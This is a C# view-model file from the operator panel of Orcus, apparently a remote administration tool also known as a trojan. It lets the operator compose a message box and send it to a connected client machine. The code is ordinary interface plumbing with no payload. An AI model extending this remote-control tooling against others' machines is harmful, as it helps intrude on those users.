using System;
using System.Windows.Forms;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.MessageBox;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.MessageBox;
using Sorzus.Wpf.Toolkit;
using Application = System.Windows.Application;
using MessageBoxButtons = Orcus.Shared.Commands.MessageBox.MessageBoxButtons;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class MessageBoxViewModel : CommandView
    {
        private string _caption;
        private MessageBoxButtons _messageBoxButtons = MessageBoxButtons.OK;
        private MessageBoxCommand _messageBoxCommand;
        private SystemIcon _messageBoxIcon = SystemIcon.Info;
        private RelayCommand _sendMessageBoxCommand;
        private RelayCommand _testMessageBoxCommand;
        private string _text;

        public override string Name { get; } = (string) Application.Current.Resources["MessageBox"];
        public override Category Category { get; } = Category.Utilities;

        public SystemIcon MessageBoxIcon
        {
            get { return _messageBoxIcon; }
            set { SetProperty(value, ref _messageBoxIcon); }
        }

        public MessageBoxButtons MessageBoxButtons
        {
            get { return _messageBoxButtons; }
            set { SetProperty(value, ref _messageBoxButtons); }
        }

        public string Caption
        {
            get { return _caption; }
            set { SetProperty(value, ref _caption); }
        }

        public string Text
        {
            get { return _text; }
            set { SetProperty(value, ref _text); }
        }

        public RelayCommand TestMessageBoxCommand
        {
            get
            {
                return _testMessageBoxCommand ?? (_testMessageBoxCommand = new RelayCommand(parameter =>
                {
                    MessageBox.Show(Text, Caption,
                        (System.Windows.Forms.MessageBoxButtons) MessageBoxButtons,
                        SystemIconToMessageBoxIcon(MessageBoxIcon));
                }));
            }
        }

        public RelayCommand SendMessageBoxCommand
        {
            get
            {
                return _sendMessageBoxCommand ??
                       (_sendMessageBoxCommand =
                           new RelayCommand(parameter => { _messageBoxCommand.SendMessageBox(GetInformation()); }));
            }
        }

        private static MessageBoxIcon SystemIconToMessageBoxIcon(SystemIcon icon)
        {
            switch (icon)
            {
                case SystemIcon.Error:
                    return System.Windows.Forms.MessageBoxIcon.Error;
                case SystemIcon.Info:
                    return System.Windows.Forms.MessageBoxIcon.Information;
                case SystemIcon.Warning:
                    return System.Windows.Forms.MessageBoxIcon.Warning;
                case SystemIcon.Question:
                    return System.Windows.Forms.MessageBoxIcon.Question;
                default:
                    return System.Windows.Forms.MessageBoxIcon.None;
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _messageBoxCommand = clientController.Commander.GetCommand<MessageBoxCommand>();
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ModalPopup.ico",
                    UriKind.Absolute));
        }

        private MessageBoxInformation GetInformation()
        {
            return new MessageBoxInformation
            {
                Icon = MessageBoxIcon,
                MessageBoxButtons = MessageBoxButtons,
                Text = Text,
                Title = Caption
            };
        }
    }
}